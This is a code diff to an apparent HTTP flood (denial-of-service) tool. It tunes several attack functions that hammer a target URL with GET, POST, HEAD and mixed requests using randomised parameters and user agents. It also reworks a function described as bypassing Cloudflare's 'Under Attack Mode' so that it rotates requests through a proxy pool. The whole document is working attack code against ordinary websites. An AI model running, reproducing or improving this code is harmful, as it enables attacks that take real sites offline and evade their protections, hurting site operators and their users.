@@ -23,7 +23,7 @@ def http_get(worker_id, session, target_url, attack_duration, useragent=None, re
     stoptime = time.time() + attack_duration
     while time.time() < stoptime and Core.attackrunning:
         try:
-            session.get(f'{target_url}{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), verify=False, timeout=(5, 2), allow_redirects=False, stream=False)
+            session.get(f'{target_url}{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), verify=False, timeout=(7,5), allow_redirects=False, stream=False)
 
             Core.infodict[worker_id]['req_sent'] += 1
         except Exception:
@@ -68,7 +68,7 @@ def http_post(worker_id, session, target_url, attack_duration, useragent=None, r
 
                 data = url_encoded_data
 
-            session.post(f'{target_url}{buildblock(target_url)}', headers=headers, data=data, verify=False, timeout=2, allow_redirects=False, stream=False)
+            session.post(f'{target_url}{buildblock(target_url)}', headers=headers, data=data, verify=False, timeout=(7,5), allow_redirects=False, stream=False)
 
             Core.infodict[worker_id]['req_sent'] += 1
         except Exception:
@@ -92,7 +92,7 @@ def http_fast(worker_id, session, target_url, attack_duration, useragent=None, r
     while time.time() < stoptime and Core.attackrunning:
         try:
 
-            session.get(f'{target_url}/', headers={'User-Agent': choice(ualist) if useragent == None else useragent}, verify=False, timeout=2, allow_redirects=False, stream=False)
+            session.get(f'{target_url}/', headers={'User-Agent': choice(ualist) if useragent == None else useragent}, verify=False, timeout=(7,5), allow_redirects=False, stream=False)
 
             Core.infodict[worker_id]['req_sent'] += 1
         except Exception:
@@ -116,7 +116,7 @@ def http_head(worker_id, session, target_url, attack_duration, useragent=None, r
     while time.time() < stoptime and Core.attackrunning:
         try:
 
-            session.head(f'{target_url}{buildblock(target_url)}', headers={'User-Agent': choice(ualist) if useragent == None else useragent}, verify=False, timeout=2, allow_redirects=False, stream=False)
+            session.head(f'{target_url}{buildblock(target_url)}', headers={'User-Agent': choice(ualist) if useragent == None else useragent}, verify=False, timeout=(7,5), allow_redirects=False, stream=False)
 
             Core.infodict[worker_id]['req_sent'] += 1
         except Exception:
@@ -141,8 +141,8 @@ def http_ghp(worker_id, session, target_url, attack_duration, useragent=None, re
         try:
 
             method_choice = randint(0,2)
-            if method_choice == 0: session.head(f'{target_url}{buildblock(target_url)}', headers={'User-Agent': choice(ualist) if useragent == None else useragent}, verify=False, timeout=2, allow_redirects=False, stream=False)
-            elif method_choice == 1: session.get(f'{target_url}{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), verify=False, timeout=(5, 2), allow_redirects=False, stream=False)
+            if method_choice == 0: session.head(f'{target_url}{buildblock(target_url)}', headers={'User-Agent': choice(ualist) if useragent == None else useragent}, verify=False, timeout=(7,5), allow_redirects=False, stream=False)
+            elif method_choice == 1: session.get(f'{target_url}{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), verify=False, timeout=(7,5), allow_redirects=False, stream=False)
             elif method_choice == 2: # url encoded data flood only
                 url_encoded_data = f'{choice(keywords)}={choice(keywords)}'
 
@@ -150,7 +150,7 @@ def http_ghp(worker_id, session, target_url, attack_duration, useragent=None, re
                     if randint(0,1) == 1: url_encoded_data += f'&{choice(keywords)}={choice(keywords)}'
                     else: pass
 
-                session.post(f'{target_url}{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), data=url_encoded_data, verify=False, timeout=2, allow_redirects=False, stream=False)
+                session.post(f'{target_url}{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), data=url_encoded_data, verify=False, timeout=(7,5), allow_redirects=False, stream=False)
 
             Core.infodict[worker_id]['req_sent'] += 1
         except Exception:
@@ -175,7 +175,7 @@ def http_leech(worker_id, session, target_url, attack_duration, useragent=None, 
     while time.time() < stoptime and Core.attackrunning:
         try:
 
-            session.get(target_url, headers=headers, verify=False, timeout=2, allow_redirects=False, stream=False)
+            session.get(target_url, headers=headers, verify=False, timeout=(7,5), allow_redirects=False, stream=False)
             time.sleep(uniform(80, 160))
 
             Core.infodict[worker_id]['req_sent'] += 1
@@ -208,8 +208,8 @@ def http_mix(worker_id, session, target_url, attack_duration, useragent=None, re
                     if randint(0,1) == 1: data += f'&{choice(keywords)}={choice(keywords)}'
                     else: pass
 
-                session.request('POST', f'{target_url}{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), data=data, verify=False, timeout=2, allow_redirects=False, stream=False)
-            else: session.request(method, f'{target_url}{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), verify=False, timeout=2, allow_redirects=False, stream=False)
+                session.request('POST', f'{target_url}{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), data=data, verify=False, timeout=(7,5), allow_redirects=False, stream=False)
+            else: session.request(method, f'{target_url}{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), verify=False, timeout=(7,5), allow_redirects=False, stream=False)
             Core.infodict[worker_id]['req_sent'] += 1
         except Exception:
             Core.infodict[worker_id]['req_fail'] += 1
@@ -218,7 +218,7 @@ def http_mix(worker_id, session, target_url, attack_duration, useragent=None, re
 
     Core.attackrunning = False
 
-def http_cfbp(worker_id, scraper, target_url, attack_duration, useragent=None, referer=None):
+def http_cfbp(worker_id, session, target_url, attack_duration, useragent=None, referer=None):
     '''
     Attack which tries to bypass Cloudflare's UAM (Under Attack Mode)
     '''
@@ -238,6 +238,7 @@ def http_cfbp(worker_id, scraper, target_url, attack_duration, useragent=None, r
         'Pragma': 'no-cache',
         'Connection': 'keep-alive',
         'Upgrade-Insecure-Requests': '1',
+        'DNT': '1',
         'Sec-Fetch-Dest': 'document',
         'Sec-Fetch-Mode': 'navigate',
         'Sec-Fetch-Site': 'same-origin',
@@ -248,7 +249,9 @@ def http_cfbp(worker_id, scraper, target_url, attack_duration, useragent=None, r
     stoptime = time.time() + attack_duration
     while time.time() < stoptime and Core.attackrunning:
         try:
-            scraper.get(url=target_url, headers=headers, timeout=2, allow_redirects=False)
+            proxip, proxport = choice(Core.proxy_pool).split(':')
+            proxy = f'{Core.proxy_type.lower()}{"h" if Core.proxy_resolve is True else ""}://{proxip}:{proxport}'
+            session.get(target_url, headers=headers, timeout=(7,5), verify=False, allow_redirects=False, stream=False, proxies={'http':proxy,'https':proxy})
 
             Core.infodict[worker_id]['req_sent'] += 1
         except Exception:
@@ -258,7 +261,7 @@ def http_cfbp(worker_id, scraper, target_url, attack_duration, useragent=None, r
 
     Core.attackrunning = False
 
-def http_proxy(worker_id, proto, target_url, attack_duration, useragent, referer):
+def http_proxy(worker_id, proto, target_url, attack_duration, useragent=None, referer=None):
     '''
     Proxified HTTP flood
     '''
@@ -307,7 +310,6 @@ def http_proxy(worker_id, proto, target_url, attack_duration, useragent, referer
                             if not sent:
                                 proxip, proxport = choice(Core.proxy_pool).split(':')
                                 s.set_proxy(proto, str(proxip), int(proxport)) # rotate proxy
-
 
                             Core.infodict[worker_id]['req_sent'] += 1
                         except:
